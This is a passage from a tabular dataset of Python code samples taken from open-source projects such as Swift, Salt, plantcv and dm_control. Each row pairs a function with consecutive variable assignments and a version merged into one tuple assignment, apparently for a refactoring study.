        self.assertEqual(elem.find('./IsTruncated').text, 'false')
        delete_markers = elem.findall('./DeleteMarker')
        self.assertEqual(0, len(delete_markers))
        expected = [
            ('subdir/bar', 'false', '1564984393.68962'),
            ('subdir/foo', 'true', 'null'),
            ('subdir/foo', 'false', '1565984382.67326'),
        ]
        discovered = [
            tuple(e.find('./%s' % key).text for key in (
                'Key', 'IsLatest', 'VersionId'))
            for e in elem.findall('./Version')
        ]
        self.assertEqual(expected, discovered)

        self._add_versions_request([], versions_listing[-1:],
                                   bucket='mybucket')
        req = Request.blank(
            '/mybucket?versions&key-marker=subdir/foo&'
            'version-id-marker=null',
            environ={'REQUEST_METHOD': 'GET'},
            headers={'Authorization': 'AWS test:tester:hmac',
                     'Date': self.get_date_header()})
        status, headers, body = self.call_s3api(req)
        self.assertEqual(status.split()[0], '200')
        elem = fromstring(body, 'ListVersionsResult')
        self.assertEqual(elem.find('./IsTruncated').text, 'false')
        delete_markers = elem.findall('./DeleteMarker')
        self.assertEqual(0, len(delete_markers))
        expected = [
            ('subdir/foo', 'false', '1565984382.67326'),
        ]
        discovered = [
            tuple(e.find('./%s' % key).text for key in (
                'Key', 'IsLatest', 'VersionId'))
            for e in elem.findall('./Version')
        ]
        self.assertEqual(expected, discovered)","expected = [('subdir/bar', 'false', '1564984393.68962'), ('subdir/foo', 'true', 'null'), ('subdir/foo', 'false', '1565984382.67326')]
discovered = [tuple((e.find('./%s' % key).text for key in ('Key', 'IsLatest', 'VersionId'))) for e in elem.findall('./Version')]","expected , discovered  = [('subdir/bar', 'false', '1564984393.68962'), ('subdir/foo', 'true', 'null'), ('subdir/foo', 'false', '1565984382.67326')], [tuple((e.find('./%s' % key).text for key in ('Key', 'IsLatest', 'VersionId'))) for e in elem.findall('./Version')]"
swift,https://github.com/openstack/swift/tree/master/test/unit/common/middleware/s3api/test_bucket.py,TestS3ApiBucket,test_bucket_GET_versions_with_key_marker_and_version_id_marker$831,"def test_bucket_GET_versions_with_key_marker_and_version_id_marker(self):
        container_listing = [{
            ""bytes"": 8192,
            ""content_type"": ""binary/octet-stream"",
            ""hash"": ""221994040b14294bdf7fbc128e66633c"",
            ""last_modified"": ""2019-08-16T19:39:53.152780"",
            ""name"": ""subdir/foo"",
        }]
        versions_listing = [{
            'bytes': 0,
            'content_type': DELETE_MARKER_CONTENT_TYPE,
            'hash': '0',
            ""last_modified"": ""2019-08-19T19:05:33.565940"",
            'name': 'subdir/bar',
            ""version_id"": ""1565241533.55320"",
            'is_latest': True,
        }, {
            ""bytes"": 8192,
            ""content_type"": ""binary/octet-stream"",
            ""hash"": ""221994040b14294bdf7fbc128e66633c"",
            ""last_modified"": ""2019-08-16T19:39:53.508510"",
            ""name"": ""subdir/bar"",
            ""version_id"": ""1564984393.68962"",
            'is_latest': False,
        }, {
            ""bytes"": 8192,
            ""content_type"": ""binary/octet-stream"",
            ""hash"": ""221994040b14294bdf7fbc128e66633c"",
            ""last_modified"": ""2019-08-16T19:39:42.673260"",
            ""name"": ""subdir/foo"",
            ""version_id"": ""1565984382.67326"",
            'is_latest': False,
        }]
        self._add_versions_request(container_listing, versions_listing,
                                   bucket='mybucket')
        req = Request.blank(
            '/mybucket?versions&key-marker=subdir/bar&'
            'version-id-marker=1566589611.065522',
            environ={'REQUEST_METHOD': 'GET'},
            headers={'Authorization': 'AWS test:tester:hmac',
                     'Date': self.get_date_header()})
        status, headers, body = self.call_s3api(req)
        self.assertEqual(status.split()[0], '200')
        elem = fromstring(body, 'ListVersionsResult')
        self.assertEqual(elem.find('./IsTruncated').text, 'false')
        delete_markers = elem.findall('./DeleteMarker')
        self.assertEqual(['subdir/bar'], [
            o.find('Key').text for o in delete_markers])
        expected = [
            ('subdir/bar', 'false', '1564984393.68962'),
            ('subdir/foo', 'true', 'null'),
            ('subdir/foo', 'false', '1565984382.67326'),
        ]
        discovered = [
            tuple(e.find('./%s' % key).text for key in (
                'Key', 'IsLatest', 'VersionId'))
            for e in elem.findall('./Version')
        ]
        self.assertEqual(expected, discovered)

        self._add_versions_request(container_listing, versions_listing[1:],
                                   bucket='mybucket')
        req = Request.blank(
            '/mybucket?versions&key-marker=subdir/bar&'
            'version-id-marker=1565241533.55320',
            environ={'REQUEST_METHOD': 'GET'},
            headers={'Authorization': 'AWS test:tester:hmac',
                     'Date': self.get_date_header()})
        status, headers, body = self.call_s3api(req)
        self.assertEqual(status.split()[0], '200')
        elem = fromstring(body, 'ListVersionsResult')
        self.assertEqual(elem.find('./IsTruncated').text, 'false')
        delete_markers = elem.findall('./DeleteMarker')
        self.assertEqual(0, len(delete_markers))
        expected = [
            ('subdir/bar', 'false', '1564984393.68962'),
            ('subdir/foo', 'true', 'null'),
            ('subdir/foo', 'false', '1565984382.67326'),
        ]
        discovered = [
            tuple(e.find('./%s' % key).text for key in (
                'Key', 'IsLatest', 'VersionId'))
            for e in elem.findall('./Version')
        ]
        self.assertEqual(expected, discovered)

        self._add_versions_request([], versions_listing[-1:],
                                   bucket='mybucket')
        req = Request.blank(
            '/mybucket?versions&key-marker=subdir/foo&'
            'version-id-marker=null',
            environ={'REQUEST_METHOD': 'GET'},
            headers={'Authorization': 'AWS test:tester:hmac',
                     'Date': self.get_date_header()})
        status, headers, body = self.call_s3api(req)
        self.assertEqual(status.split()[0], '200')
        elem = fromstring(body, 'ListVersionsResult')
        self.assertEqual(elem.find('./IsTruncated').text, 'false')
        delete_markers = elem.findall('./DeleteMarker')
        self.assertEqual(0, len(delete_markers))
        expected = [
            ('subdir/foo', 'false', '1565984382.67326'),
        ]
        discovered = [
            tuple(e.find('./%s' % key).text for key in (
                'Key', 'IsLatest', 'VersionId'))
            for e in elem.findall('./Version')
        ]
        self.assertEqual(expected, discovered)","expected = [('subdir/foo', 'false', '1565984382.67326')]
discovered = [tuple((e.find('./%s' % key).text for key in ('Key', 'IsLatest', 'VersionId'))) for e in elem.findall('./Version')]","expected , discovered  = [('subdir/foo', 'false', '1565984382.67326')], [tuple((e.find('./%s' % key).text for key in ('Key', 'IsLatest', 'VersionId'))) for e in elem.findall('./Version')]"
salt,https://github.com/saltstack/salt/tree/master/tests/unit/cloud/clouds/test_vmware.py,VMwareTestCase,test_add_host_both_cluster_and_datacenter_in_kwargs$818,"def test_add_host_both_cluster_and_datacenter_in_kwargs(self):
        """"""
        Tests that a SaltCloudSystemExit is raised when both cluster and datacenter
        are present in kwargs that are provided to add_host.
        """"""
        provider_config_additions = {
            ""esxi_host_user"": ""root"",
            ""esxi_host_password"": ""myhostpassword"",
        }

        provider_config = copy.deepcopy(PROVIDER_CONFIG)
        provider_config[""vcenter01""][""vmware""].update(provider_config_additions)

        with patch.dict(vmware.__opts__, {""providers"": provider_config}, clean=True):
            self.assertRaisesWithMessage(
                SaltCloudSystemExit,
                ""You must specify either the cluster name or the datacenter name."",
                vmware.add_host,
                kwargs={
                    ""host"": ""my-esxi-host"",
                    ""datacenter"": ""my-datacenter"",
                    ""cluster"": ""my-cluster"",
                },
                call=""function"",
            )","provider_config_additions = {'esxi_host_user': 'root', 'esxi_host_password': 'myhostpassword'}
provider_config = copy.deepcopy(PROVIDER_CONFIG)","provider_config_additions , provider_config  = {'esxi_host_user': 'root', 'esxi_host_password': 'myhostpassword'}, copy.deepcopy(PROVIDER_CONFIG)"
tensorflow-fcn,https://github.com/MarvinTeichmann/tensorflow-fcn/tree/master//loss.py,,loss$15,"def loss(logits, labels, num_classes, head=None):
    """"""Calculate the loss from the logits and the labels.

    Args:
      logits: tensor, float - [batch_size, width, height, num_classes].
          Use vgg_fcn.upscore as logits.
      labels: Labels tensor, int32 - [batch_size, width, height, num_classes].
          The ground truth of your data.
      head: numpy array - [num_classes]
          Weighting the loss of each class
          Optional: Prioritize some classes

    Returns:
      loss: Loss tensor of type float.
    """"""
    with tf.name_scope('loss'):
        logits = tf.reshape(logits, (-1, num_classes))
        epsilon = tf.constant(value=1e-4)
        labels = tf.to_float(tf.reshape(labels, (-1, num_classes)))

        softmax = tf.nn.softmax(logits) + epsilon

        if head is not None:
            cross_entropy = -tf.reduce_sum(tf.multiply(labels * tf.log(softmax),
                                           head), reduction_indices=[1])
        else:
            cross_entropy = -tf.reduce_sum(
                labels * tf.log(softmax), reduction_indices=[1])

        cross_entropy_mean = tf.reduce_mean(cross_entropy,
                                            name='xentropy_mean')
        tf.add_to_collection('losses', cross_entropy_mean)

        loss = tf.add_n(tf.get_collection('losses'), name='total_loss')
    return loss","logits = tf.reshape(logits, (-1, num_classes))
epsilon = tf.constant(value=0.0001)","logits , epsilon  = tf.reshape(logits, (-1, num_classes)), tf.constant(value=0.0001)"
tensorflow-fcn,https://github.com/MarvinTeichmann/tensorflow-fcn/tree/master//loss.py,,loss$15,"def loss(logits, labels, num_classes, head=None):
    """"""Calculate the loss from the logits and the labels.

    Args:
      logits: tensor, float - [batch_size, width, height, num_classes].
          Use vgg_fcn.upscore as logits.
      labels: Labels tensor, int32 - [batch_size, width, height, num_classes].
          The ground truth of your data.
      head: numpy array - [num_classes]
          Weighting the loss of each class
          Optional: Prioritize some classes

    Returns:
      loss: Loss tensor of type float.
    """"""
    with tf.name_scope('loss'):
        logits = tf.reshape(logits, (-1, num_classes))
        epsilon = tf.constant(value=1e-4)
        labels = tf.to_float(tf.reshape(labels, (-1, num_classes)))

        softmax = tf.nn.softmax(logits) + epsilon

        if head is not None:
            cross_entropy = -tf.reduce_sum(tf.multiply(labels * tf.log(softmax),
                                           head), reduction_indices=[1])
        else:
            cross_entropy = -tf.reduce_sum(
                labels * tf.log(softmax), reduction_indices=[1])

        cross_entropy_mean = tf.reduce_mean(cross_entropy,
                                            name='xentropy_mean')
        tf.add_to_collection('losses', cross_entropy_mean)

        loss = tf.add_n(tf.get_collection('losses'), name='total_loss')
    return loss","labels = tf.to_float(tf.reshape(labels, (-1, num_classes)))
softmax = tf.nn.softmax(logits) + epsilon","labels , softmax  = tf.to_float(tf.reshape(labels, (-1, num_classes))), tf.nn.softmax(logits) + epsilon"
DPR,https://github.com/facebookresearch/DPR/tree/master/dpr/models/biencoder.py,BiEncoder,get_representation$79,"def get_representation(
        sub_model: nn.Module,
        ids: T,
        segments: T,
        attn_mask: T,
        fix_encoder: bool = False,
        representation_token_pos=0,
    ) -> (T, T, T):
        sequence_output = None
        pooled_output = None
        hidden_states = None
        if ids is not None:
            if fix_encoder:
                with torch.no_grad():
                    sequence_output, pooled_output, hidden_states = sub_model(
                        ids,
                        segments,
                        attn_mask,
                        representation_token_pos=representation_token_pos,
                    )

                if sub_model.training:
                    sequence_output.requires_grad_(requires_grad=True)
                    pooled_output.requires_grad_(requires_grad=True)
            else:
                sequence_output, pooled_output, hidden_states = sub_model(
                    ids,
                    segments,
                    attn_mask,
                    representation_token_pos=representation_token_pos,
                )

        return sequence_output, pooled_output, hidden_states","sequence_output = None
pooled_output = None
hidden_states = None","sequence_output , pooled_output , hidden_states  = None, None, None"
viper,https://github.com/viper-framework/viper/tree/master/viper/core/ui/console.py,Console,parse$76,"def parse(self, data):
        root = """"
        args = []

        # Split words by white space.
        words = data.split()
        # First word is the root command.
        root = words[0]

        # If there are more words, populate the arguments list.
        if len(words) > 1:
            args = words[1:]

        return (root, args)","args = []
words = data.split()","args , words  = [], data.split()"
vibora,https://github.com/vibora-io/vibora/tree/master/vibora/headers/headers.py,Headers,__init__$5,"def __init__(self, raw=None):
        self.raw = raw or []
        self.values = None
        self.evaluated = False","self.raw = raw or []
self.values = None
self.evaluated = False","self.raw , self.values , self.evaluated  = raw or [], None, False"
requests-oauthlib,https://github.com/requests/requests-oauthlib/tree/master/tests/test_compliance_fixes.py,MailChimpComplianceFixTest,test_fetch_access_token$115,"def test_fetch_access_token(self):
        token = self.session.fetch_token(
            ""https://login.mailchimp.com/oauth2/token"",
            client_secret=""someclientsecret"",
            authorization_response=""https://i.b/?code=hello"",
        )
        # Times should be close
        approx_expires_at = time.time() + 3600
        actual_expires_at = token.pop(""expires_at"")
        self.assertAlmostEqual(actual_expires_at, approx_expires_at, places=2)

        # Other token values exact
        self.assertEqual(token, {""access_token"": ""mailchimp"", ""expires_in"": 3600})

        # And no scope at all
        self.assertNotIn(""scope"", token)","approx_expires_at = time.time() + 3600
actual_expires_at = token.pop('expires_at')","approx_expires_at , actual_expires_at  = time.time() + 3600, token.pop('expires_at')"
djongo,https://github.com/nesdis/djongo/tree/master/tests/django_tests/tests/v21/tests/view_tests/tests/test_static.py,StaticTests,test_invalid_if_modified_since$77,"def test_invalid_if_modified_since(self):
        """"""Handle bogus If-Modified-Since values gracefully

        Assume that a file is modified since an invalid timestamp as per RFC
        2616, section 14.25.
        """"""
        file_name = 'file.txt'
        invalid_date = 'Mon, 28 May 999999999999 28:25:26 GMT'
        response = self.client.get('/%s/%s' % (self.prefix, file_name),
                                   HTTP_IF_MODIFIED_SINCE=invalid_date)
        response_content = b''.join(response)
        with open(path.join(media_dir, file_name), 'rb') as fp:
            self.assertEqual(fp.read(), response_content)
        self.assertEqual(len(response_content), int(response['Content-Length']))","file_name = 'file.txt'
invalid_date = 'Mon, 28 May 999999999999 28:25:26 GMT'","file_name , invalid_date  = 'file.txt', 'Mon, 28 May 999999999999 28:25:26 GMT'"
dm_control,https://github.com/deepmind/dm_control/tree/master/dm_control/locomotion/arenas/bowl.py,Bowl,initialize_episode$100,"def initialize_episode(self, physics, random_state):
    if self._regenerate:
      self._regenerate = False

      # Get heightfield resolution, assert that it is square.
      res = physics.bind(self._hfield).nrow
      assert res == physics.bind(self._hfield).ncol

      # Sinusoidal bowl shape.
      row_grid, col_grid = np.ogrid[-1:1:res*1j, -1:1:res*1j]
      radius = np.clip(np.sqrt(col_grid**2 + row_grid**2), .1, 1)
      bowl_shape = .5 - np.cos(2*np.pi*radius)/2

      # Random smooth bumps.
      terrain_size = 2 * physics.bind(self._hfield).size[0]
      bump_res = int(terrain_size / _TERRAIN_BUMP_SCALE)
      bumps = random_state.uniform(_TERRAIN_SMOOTHNESS, 1, (bump_res, bump_res))
      smooth_bumps = ndimage.zoom(bumps, res / float(bump_res))

      # Terrain is elementwise product.
      terrain = bowl_shape * smooth_bumps
      start_idx = physics.bind(self._hfield).adr
      physics.model.hfield_data[start_idx:start_idx+res**2] = terrain.ravel()

      # If we have a rendering context, we need to re-upload the modified
      # heightfield data.
      if physics.contexts:
        with physics.contexts.gl.make_current() as ctx:
          ctx.call(mjlib.mjr_uploadHField,
                   physics.model.ptr,
                   physics.contexts.mujoco.ptr,
                   physics.bind(self._hfield).element_id)","self._regenerate = False
res = physics.bind(self._hfield).nrow","self._regenerate , res  = False, physics.bind(self._hfield).nrow"
dm_control,https://github.com/deepmind/dm_control/tree/master/dm_control/locomotion/arenas/bowl.py,Bowl,initialize_episode$100,"def initialize_episode(self, physics, random_state):
    if self._regenerate:
      self._regenerate = False

      # Get heightfield resolution, assert that it is square.
      res = physics.bind(self._hfield).nrow
      assert res == physics.bind(self._hfield).ncol

      # Sinusoidal bowl shape.
      row_grid, col_grid = np.ogrid[-1:1:res*1j, -1:1:res*1j]
      radius = np.clip(np.sqrt(col_grid**2 + row_grid**2), .1, 1)
      bowl_shape = .5 - np.cos(2*np.pi*radius)/2

      # Random smooth bumps.
      terrain_size = 2 * physics.bind(self._hfield).size[0]
      bump_res = int(terrain_size / _TERRAIN_BUMP_SCALE)
      bumps = random_state.uniform(_TERRAIN_SMOOTHNESS, 1, (bump_res, bump_res))
      smooth_bumps = ndimage.zoom(bumps, res / float(bump_res))

      # Terrain is elementwise product.
      terrain = bowl_shape * smooth_bumps
      start_idx = physics.bind(self._hfield).adr
      physics.model.hfield_data[start_idx:start_idx+res**2] = terrain.ravel()

      # If we have a rendering context, we need to re-upload the modified
      # heightfield data.
      if physics.contexts:
        with physics.contexts.gl.make_current() as ctx:
          ctx.call(mjlib.mjr_uploadHField,
                   physics.model.ptr,
                   physics.contexts.mujoco.ptr,
                   physics.bind(self._hfield).element_id)","bowl_shape = 0.5 - np.cos(2 * np.pi * radius) / 2
terrain_size = 2 * physics.bind(self._hfield).size[0]","bowl_shape , terrain_size  = 0.5 - np.cos(2 * np.pi * radius) / 2, 2 * physics.bind(self._hfield).size[0]"
dm_control,https://github.com/deepmind/dm_control/tree/master/dm_control/locomotion/arenas/bowl.py,Bowl,initialize_episode$100,"def initialize_episode(self, physics, random_state):
    if self._regenerate:
      self._regenerate = False

      # Get heightfield resolution, assert that it is square.
      res = physics.bind(self._hfield).nrow
      assert res == physics.bind(self._hfield).ncol

      # Sinusoidal bowl shape.
      row_grid, col_grid = np.ogrid[-1:1:res*1j, -1:1:res*1j]
      radius = np.clip(np.sqrt(col_grid**2 + row_grid**2), .1, 1)
      bowl_shape = .5 - np.cos(2*np.pi*radius)/2

      # Random smooth bumps.
      terrain_size = 2 * physics.bind(self._hfield).size[0]
      bump_res = int(terrain_size / _TERRAIN_BUMP_SCALE)
      bumps = random_state.uniform(_TERRAIN_SMOOTHNESS, 1, (bump_res, bump_res))
      smooth_bumps = ndimage.zoom(bumps, res / float(bump_res))

      # Terrain is elementwise product.
      terrain = bowl_shape * smooth_bumps
      start_idx = physics.bind(self._hfield).adr
      physics.model.hfield_data[start_idx:start_idx+res**2] = terrain.ravel()

      # If we have a rendering context, we need to re-upload the modified
      # heightfield data.
      if physics.contexts:
        with physics.contexts.gl.make_current() as ctx:
          ctx.call(mjlib.mjr_uploadHField,
                   physics.model.ptr,
                   physics.contexts.mujoco.ptr,
                   physics.bind(self._hfield).element_id)","terrain = bowl_shape * smooth_bumps
start_idx = physics.bind(self._hfield).adr","terrain , start_idx  = bowl_shape * smooth_bumps, physics.bind(self._hfield).adr"
plantcv,https://github.com/danforthcenter/plantcv/tree/master/plantcv/plantcv/cluster_contours.py,,cluster_contours$9,"def cluster_contours(img, roi_objects, roi_obj_hierarchy, nrow=1, ncol=1, show_grid=False):
    """"""
    This function take a image with multiple contours and clusters them based on user input of rows and columns

    Inputs:
    img                     = RGB or grayscale image data for plotting
    roi_objects             = object contours in an image that are needed to be clustered.
    roi_obj_hierarchy       = object hierarchy
    nrow                    = number of rows to cluster (this should be the approximate  number of desired rows
                              in the entire image (even if there isn't a literal row of plants)
    ncol                    = number of columns to cluster (this should be the approximate number of desired columns
                              in the entire image (even if there isn't a literal row of plants)
    show_grid               = if True then the grid will get plot to show how plants are being clustered

    Returns:
    grouped_contour_indexes = contours grouped
    contours                = All inputed contours

    :param img: numpy.ndarray
    :param roi_objects: list
    :param roi_obj_hierarchy: numpy.ndarray
    :param nrow: int
    :param ncol: int
    :param show_grid: bool
    :return grouped_contour_indexes: list
    :return contours: list
    :return roi_obj_hierarchy: list
    """"""

    if len(np.shape(img)) == 3:
        iy, ix, iz = np.shape(img)
    else:
        iy, ix, = np.shape(img)

    # get the break groups
    if nrow == 1:
        rbreaks = [0, iy]
    else:
        rstep = np.rint(iy / nrow)
        rstep1 = int(rstep)
        rbreaks = range(0, iy, rstep1)
    if ncol == 1:
        cbreaks = [0, ix]
    else:
        cstep = np.rint(ix / ncol)
        cstep1 = int(cstep)
        cbreaks = range(0, ix, cstep1)

    # categorize what bin the center of mass of each contour
    def digitize(a, step):
        # The way cbreaks and rbreaks are calculated, step will never be an integer
        # if isinstance(step, int):
        #     i = step
        # else:
        num_bins = len(step)
        for x in range(0, num_bins):
            if x == 0:
                if a >= 0 and a < step[1]:
                    return 1
            else:
                if a >= step[x - 1] and a < step[x]:
                    return x
                elif a >= np.max(step):
                    return num_bins

    dtype = [('cx', int), ('cy', int), ('rowbin', int), ('colbin', int), ('index', int)]
    coord = []
    for i in range(0, len(roi_objects)):
        m = cv2.moments(roi_objects[i])
        if m['m00'] == 0:
            pass
        else:
            cx = int(m['m10'] / m['m00'])
            cy = int(m['m01'] / m['m00'])
            colbin = digitize(cx, cbreaks)
            rowbin = digitize(cy, rbreaks)
            a = (cx, cy, colbin, rowbin, i)
            coord.append(a)
    coord1 = np.array(coord, dtype=dtype)
    coord2 = np.sort(coord1, order=('colbin', 'rowbin'))

    # get the list of unique coordinates and group the contours with the same bin coordinates
    groups = []
    for i, y in enumerate(coord2):
        col = y[3]
        row = y[2]
        location = str(row) + ',' + str(col)
        groups.append(location)

    unigroup = np.unique(groups)
    coordgroups = []

    for i, y in enumerate(unigroup):
        col_row = y.split(',')
        col = int(col_row[0])
        row = int(col_row[1])
        for a, b in enumerate(coord2):
            if b[2] == col and b[3] == row:
                grp = i
                contour = b[4]
                coordgroups.append((grp, contour))
            else:
                pass

    coordlist = [[y[1] for y in coordgroups if y[0] == x] for x in range(0, (len(unigroup)))]

    contours = roi_objects
    grouped_contour_indexes = coordlist

    # Debug image is rainbow printed contours

    if params.debug is not None:
        if len(np.shape(img)) == 3:
            img_copy = np.copy(img)
        else:
            iy, ix = np.shape(img)
            img_copy = np.zeros((iy, ix, 3), dtype=np.uint8)

        rand_color = color_palette(len(coordlist))
        for i, x in enumerate(coordlist):
            for a in x:
                if roi_obj_hierarchy[0][a][3] > -1:
                    pass
                else:
                    cv2.drawContours(img_copy, roi_objects, a, rand_color[i], -1, hierarchy=roi_obj_hierarchy)
        if show_grid:
            for y in rbreaks:
                cv2.line(img_copy, (0, y), (ix, y), (255, 0, 0), params.line_thickness)
            for x in cbreaks:
                cv2.line(img_copy, (x, 0), (x, iy), (255, 0, 0), params.line_thickness)
    else:
        img_copy = img  # for _debug

    _debug(visual=img_copy,  # keep this outside if statement to avoid additional test
           filename=os.path.join(params.debug_outdir, str(params.device) + '_clusters.png'))

    return grouped_contour_indexes, contours, roi_obj_hierarchy","dtype = [('cx', int), ('cy', int), ('rowbin', int), ('colbin', int), ('index', int)]
coord = []","dtype , coord  = [('cx', int), ('cy', int), ('rowbin', int), ('colbin', int), ('index', int)], []"
plantcv,https://github.com/danforthcenter/plantcv/tree/master/plantcv/plantcv/cluster_contours.py,,cluster_contours$9,"def cluster_contours(img, roi_objects, roi_obj_hierarchy, nrow=1, ncol=1, show_grid=False):
    """"""
    This function take a image with multiple contours and clusters them based on user input of rows and columns

    Inputs:
    img                     = RGB or grayscale image data for plotting
    roi_objects             = object contours in an image that are needed to be clustered.
    roi_obj_hierarchy       = object hierarchy
    nrow                    = number of rows to cluster (this should be the approximate  number of desired rows
                              in the entire image (even if there isn't a literal row of plants)
    ncol                    = number of columns to cluster (this should be the approximate number of desired columns
                              in the entire image (even if there isn't a literal row of plants)
    show_grid               = if True then the grid will get plot to show how plants are being clustered

    Returns:
    grouped_contour_indexes = contours grouped
    contours                = All inputed contours

    :param img: numpy.ndarray
    :param roi_objects: list
    :param roi_obj_hierarchy: numpy.ndarray
    :param nrow: int
    :param ncol: int
    :param show_grid: bool
    :return grouped_contour_indexes: list
    :return contours: list
    :return roi_obj_hierarchy: list
    """"""

    if len(np.shape(img)) == 3:
        iy, ix, iz = np.shape(img)
    else:
        iy, ix, = np.shape(img)

    # get the break groups
    if nrow == 1:
        rbreaks = [0, iy]
    else:
        rstep = np.rint(iy / nrow)
        rstep1 = int(rstep)
        rbreaks = range(0, iy, rstep1)
    if ncol == 1:
        cbreaks = [0, ix]
    else:
        cstep = np.rint(ix / ncol)
        cstep1 = int(cstep)
        cbreaks = range(0, ix, cstep1)

    # categorize what bin the center of mass of each contour
    def digitize(a, step):
        # The way cbreaks and rbreaks are calculated, step will never be an integer
        # if isinstance(step, int):
        #     i = step
        # else:
        num_bins = len(step)
        for x in range(0, num_bins):
            if x == 0:
                if a >= 0 and a < step[1]:
                    return 1
            else:
                if a >= step[x - 1] and a < step[x]:
                    return x
                elif a >= np.max(step):
                    return num_bins

    dtype = [('cx', int), ('cy', int), ('rowbin', int), ('colbin', int), ('index', int)]
    coord = []
    for i in range(0, len(roi_objects)):
        m = cv2.moments(roi_objects[i])
        if m['m00'] == 0:
            pass
        else:
            cx = int(m['m10'] / m['m00'])
            cy = int(m['m01'] / m['m00'])
            colbin = digitize(cx, cbreaks)
            rowbin = digitize(cy, rbreaks)
            a = (cx, cy, colbin, rowbin, i)
            coord.append(a)
    coord1 = np.array(coord, dtype=dtype)
    coord2 = np.sort(coord1, order=('colbin', 'rowbin'))

    # get the list of unique coordinates and group the contours with the same bin coordinates
    groups = []
    for i, y in enumerate(coord2):
        col = y[3]
        row = y[2]
        location = str(row) + ',' + str(col)
        groups.append(location)

    unigroup = np.unique(groups)
    coordgroups = []

    for i, y in enumerate(unigroup):
        col_row = y.split(',')
        col = int(col_row[0])
        row = int(col_row[1])
        for a, b in enumerate(coord2):
            if b[2] == col and b[3] == row:
                grp = i
                contour = b[4]
                coordgroups.append((grp, contour))
            else:
                pass

    coordlist = [[y[1] for y in coordgroups if y[0] == x] for x in range(0, (len(unigroup)))]

    contours = roi_objects
    grouped_contour_indexes = coordlist

    # Debug image is rainbow printed contours

    if params.debug is not None:
        if len(np.shape(img)) == 3:
            img_copy = np.copy(img)
        else:
            iy, ix = np.shape(img)
            img_copy = np.zeros((iy, ix, 3), dtype=np.uint8)

        rand_color = color_palette(len(coordlist))
        for i, x in enumerate(coordlist):
            for a in x:
                if roi_obj_hierarchy[0][a][3] > -1:
                    pass
                else:
                    cv2.drawContours(img_copy, roi_objects, a, rand_color[i], -1, hierarchy=roi_obj_hierarchy)
        if show_grid:
            for y in rbreaks:
                cv2.line(img_copy, (0, y), (ix, y), (255, 0, 0), params.line_thickness)
            for x in cbreaks:
                cv2.line(img_copy, (x, 0), (x, iy), (255, 0, 0), params.line_thickness)
    else:
        img_copy = img  # for _debug

    _debug(visual=img_copy,  # keep this outside if statement to avoid additional test
           filename=os.path.join(params.debug_outdir, str(params.device) + '_clusters.png'))

    return grouped_contour_indexes, contours, roi_obj_hierarchy","coord2 = np.sort(coord1, order=('colbin', 'rowbin'))
groups = []","coord2 , groups  = np.sort(coord1, order=('colbin', 'rowbin')), []"
plantcv,https://github.com/danforthcenter/plantcv/tree/master/plantcv/plantcv/cluster_contours.py,,cluster_contours$9,"def cluster_contours(img, roi_objects, roi_obj_hierarchy, nrow=1, ncol=1, show_grid=False):
    """"""
    This function take a image with multiple contours and clusters them based on user input of rows and columns

    Inputs:
    img                     = RGB or grayscale image data for plotting
    roi_objects             = object contours in an image that are needed to be clustered.
    roi_obj_hierarchy       = object hierarchy
    nrow                    = number of rows to cluster (this should be the approximate  number of desired rows
                              in the entire image (even if there isn't a literal row of plants)
    ncol                    = number of columns to cluster (this should be the approximate number of desired columns
                              in the entire image (even if there isn't a literal row of plants)
    show_grid               = if True then the grid will get plot to show how plants are being clustered

    Returns:
    grouped_contour_indexes = contours grouped
    contours                = All inputed contours

    :param img: numpy.ndarray
    :param roi_objects: list
    :param roi_obj_hierarchy: numpy.ndarray
    :param nrow: int
    :param ncol: int
    :param show_grid: bool
    :return grouped_contour_indexes: list
    :return contours: list
    :return roi_obj_hierarchy: list
    """"""

    if len(np.shape(img)) == 3:
        iy, ix, iz = np.shape(img)
    else:
        iy, ix, = np.shape(img)

    # get the break groups
    if nrow == 1:
        rbreaks = [0, iy]
    else:
        rstep = np.rint(iy / nrow)
        rstep1 = int(rstep)
        rbreaks = range(0, iy, rstep1)
    if ncol == 1:
        cbreaks = [0, ix]
    else:
        cstep = np.rint(ix / ncol)
        cstep1 = int(cstep)
        cbreaks = range(0, ix, cstep1)

    # categorize what bin the center of mass of each contour
    def digitize(a, step):
        # The way cbreaks and rbreaks are calculated, step will never be an integer
        # if isinstance(step, int):
        #     i = step
        # else:
        num_bins = len(step)
        for x in range(0, num_bins):
            if x == 0:
                if a >= 0 and a < step[1]:
                    return 1
            else:
                if a >= step[x - 1] and a < step[x]:
                    return x
                elif a >= np.max(step):
                    return num_bins

    dtype = [('cx', int), ('cy', int), ('rowbin', int), ('colbin', int), ('index', int)]
    coord = []
    for i in range(0, len(roi_objects)):
        m = cv2.moments(roi_objects[i])
        if m['m00'] == 0:
            pass
        else:
            cx = int(m['m10'] / m['m00'])
            cy = int(m['m01'] / m['m00'])
            colbin = digitize(cx, cbreaks)
            rowbin = digitize(cy, rbreaks)
            a = (cx, cy, colbin, rowbin, i)
            coord.append(a)
    coord1 = np.array(coord, dtype=dtype)
    coord2 = np.sort(coord1, order=('colbin', 'rowbin'))

    # get the list of unique coordinates and group the contours with the same bin coordinates
    groups = []
    for i, y in enumerate(coord2):
        col = y[3]
        row = y[2]
        location = str(row) + ',' + str(col)
        groups.append(location)

    unigroup = np.unique(groups)
    coordgroups = []

    for i, y in enumerate(unigroup):
        col_row = y.split(',')
        col = int(col_row[0])
        row = int(col_row[1])
        for a, b in enumerate(coord2):
            if b[2] == col and b[3] == row:
                grp = i
                contour = b[4]
                coordgroups.append((grp, contour))
            else:
                pass

    coordlist = [[y[1] for y in coordgroups if y[0] == x] for x in range(0, (len(unigroup)))]

    contours = roi_objects
    grouped_contour_indexes = coordlist

    # Debug image is rainbow printed contours

    if params.debug is not None:
        if len(np.shape(img)) == 3:
            img_copy = np.copy(img)
        else:
            iy, ix = np.shape(img)
            img_copy = np.zeros((iy, ix, 3), dtype=np.uint8)

        rand_color = color_palette(len(coordlist))
        for i, x in enumerate(coordlist):
            for a in x:
                if roi_obj_hierarchy[0][a][3] > -1:
                    pass
                else:
                    cv2.drawContours(img_copy, roi_objects, a, rand_color[i], -1, hierarchy=roi_obj_hierarchy)
        if show_grid:
            for y in rbreaks:
                cv2.line(img_copy, (0, y), (ix, y), (255, 0, 0), params.line_thickness)
            for x in cbreaks:
                cv2.line(img_copy, (x, 0), (x, iy), (255, 0, 0), params.line_thickness)
    else:
        img_copy = img  # for _debug

    _debug(visual=img_copy,  # keep this outside if statement to avoid additional test
           filename=os.path.join(params.debug_outdir, str(params.device) + '_clusters.png'))

    return grouped_contour_indexes, contours, roi_obj_hierarchy","unigroup = np.unique(groups)
